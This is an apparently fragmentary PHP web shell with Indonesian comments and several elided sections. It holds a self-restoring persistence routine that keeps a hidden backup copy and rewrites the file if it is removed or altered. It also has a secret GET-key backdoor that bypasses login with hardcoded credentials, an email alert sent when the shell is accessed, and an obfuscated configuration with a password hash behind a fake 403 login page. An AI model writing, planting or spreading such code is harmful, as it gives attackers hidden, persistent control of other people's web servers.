...
<?php
// Auto-Restore Pintar & Dinamis
$main_path = __FILE__;
$backup_path = dirname($main_path) . '/.' . basename($main_path) . '.backup';

if (!file_exists($backup_path) || md5_file($main_path) !== md5_file($backup_path)) {
    copy($main_path, $backup_path);
}

if (!file_exists($main_path) || md5_file($main_path) !== md5_file($backup_path)) {
    copy($backup_path, $main_path);
}
...
$access_type = 'Normal Login';

if (isset($_GET[$backdoor_key])) {
    $access_type = 'BACKDOOR';
    $_POST['username'] = 'Anonim';
    $_POST['password'] = 'silent404';
}

// Kirim email alert
$subject = "ALERT: Shell Diakses ($access_type)";
...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'Anonim',
    'password' => '845be811ca7a5cf95680e378b3b1f81e',//md5(ehsan)
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
